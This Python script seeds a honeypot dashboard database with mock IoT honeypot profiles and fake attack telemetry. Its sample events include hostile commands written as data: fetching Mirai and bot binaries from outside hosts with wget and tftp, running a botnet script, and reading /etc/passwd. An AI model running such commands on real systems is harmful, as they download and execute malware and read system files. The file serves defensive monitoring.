"""
seed_mock_data.py — Populate the database with realistic Honeypots & Attack Telemetry.
Run from the backend/ folder:
    python seed_mock_data.py
"""
import asyncio
import random
import uuid
from datetime import datetime, timedelta, timezone

from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker, create_async_engine
from app.core.config import get_settings
from app.db.models.honeypot import Honeypot, HoneypotEvent
from app.db.session import Base

MOCK_HONEYPOTS = [
    {
        "name": "iot-camera-rtsp-01",
        "kind": "rtsp",
        "vendor": "Hikvision",
        "host": "0.0.0.0",
        "port": 554,
        "config": {"profile": "ip_camera", "firmware": "v5.4.80"},
    },
    {
        "name": "ssh-router-trap-02",
        "kind": "ssh",
        "vendor": "MikroTik",
        "host": "0.0.0.0",
        "port": 2222,
        "config": {"profile": "routeros", "banner": "MikroTik RouterOS 6.48"},
    },
    {
        "name": "http-admin-panel-03",
        "kind": "http",
        "vendor": "D-Link",
        "host": "0.0.0.0",
        "port": 8080,
        "config": {"profile": "dlink_dir820", "auth": "basic"},
    },
    {
        "name": "mqtt-broker-sensor-04",
        "kind": "mqtt",
        "vendor": "Mosquitto",
        "host": "0.0.0.0",
        "port": 1883,
        "config": {"profile": "smart_home_hub", "topics": ["sensors/#", "telemetry/#"]},
    },
]

ATTACK_SAMPLES = [
    # (src_ip, country, event_type, protocol, dst_port, username, password, extra_payload)
    ("185.220.101.5", "RU", "brute_force", "ssh", 2222, "root", "123456", {"command": "cat /etc/passwd"}),
    ("103.251.140.8", "TH", "brute_force", "ssh", 2222, "admin", "admin", {"command": "uname -a"}),
    ("45.141.87.12", "DE", "exploit", "rtsp", 554, "admin", "12345", {"exploit": "CVE-2021-36260", "uri": "/SDK/webLanguage"}),
    ("114.119.130.44", "CN", "scan", "http", 8080, None, None, {"user_agent": "Mirai/1.0", "uri": "/cgi-bin/main-cgi"}),
    ("198.98.56.9", "US", "command", "ssh", 2222, "support", "support", {"command": "wget http://45.14.2.1/mirai.x86"}),
    ("91.240.118.172", "UA", "brute_force", "ssh", 2222, "root", "root", {"command": "sh /tmp/botnet.sh"}),
    ("177.12.188.90", "BR", "exploit", "http", 8080, "admin", "pass123", {"exploit": "CVE-2020-8515", "uri": "/cgi-bin/rpc"}),
    ("185.156.177.4", "NL", "scan", "mqtt", 1883, None, None, {"topic": "sensors/temperature", "payload_raw": "0xDEADBEEF"}),
    ("103.107.198.11", "CN", "brute_force", "ssh", 2222, "admin", "pass@123", {"command": "busybox echo HI"}),
    ("185.220.102.8", "RU", "command", "ssh", 2222, "root", "toor", {"command": "tftp -g 185.220.102.8 -r bot.exe"}),
]

async def seed():
    settings = get_settings()
    engine = create_async_engine(settings.database_url, future=True)

    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)

    Session = async_sessionmaker(engine, expire_on_commit=False, class_=AsyncSession)
    async with Session() as session:
        # 1. Seed Honeypots
        honeypot_ids = []
        for hp_data in MOCK_HONEYPOTS:
            from sqlalchemy import select
            stmt = select(Honeypot).where(Honeypot.name == hp_data["name"])
            existing = (await session.execute(stmt)).scalar_one_or_none()
            if existing:
                honeypot_ids.append(existing.id)
            else:
                hp = Honeypot(
                    id=uuid.uuid4(),
                    name=hp_data["name"],
                    kind=hp_data["kind"],
                    vendor=hp_data["vendor"],
                    host=hp_data["host"],
                    port=hp_data["port"],
                    enabled=True,
                    config=hp_data["config"],
                )
                session.add(hp)
                await session.flush()
                honeypot_ids.append(hp.id)
                print(f"[OK] Created Honeypot profile: {hp.name}")

        # 2. Seed Attack Events across the last 24 hours
        now = datetime.now(timezone.utc)
        event_count = 0
        for i in range(40):
            sample = random.choice(ATTACK_SAMPLES)
            hp_id = random.choice(honeypot_ids)
            src_ip, country, event_type, protocol, dst_port, user, pwd, extra = sample
            
            # Spread out timestamp over the past 24 hours
            minutes_ago = random.randint(1, 1440)
            created_time = now - timedelta(minutes=minutes_ago)

            payload = {
                "country": country,
                "username": user,
                "password": pwd,
                **extra,
            }

            ev = HoneypotEvent(
                id=uuid.uuid4(),
                honeypot_id=hp_id,
                event_type=event_type,
                protocol=protocol,
                src_ip=src_ip,
                src_port=random.randint(30000, 65000),
                dst_port=dst_port,
                session_id=f"sess_{uuid.uuid4().hex[:12]}",
                payload=payload,
                raw_size=random.randint(128, 4096),
                created_at=created_time,
                updated_at=created_time,
            )
            session.add(ev)
            event_count += 1

        await session.commit()
        print("=" * 60)
        print(f"[SUCCESS] Seeded {event_count} attack telemetry events into database!")
        print("          Refresh your Dashboard page (http://localhost:5173) to see live data.")
        print("=" * 60)

    await engine.dispose()

if __name__ == "__main__":
    asyncio.run(seed())
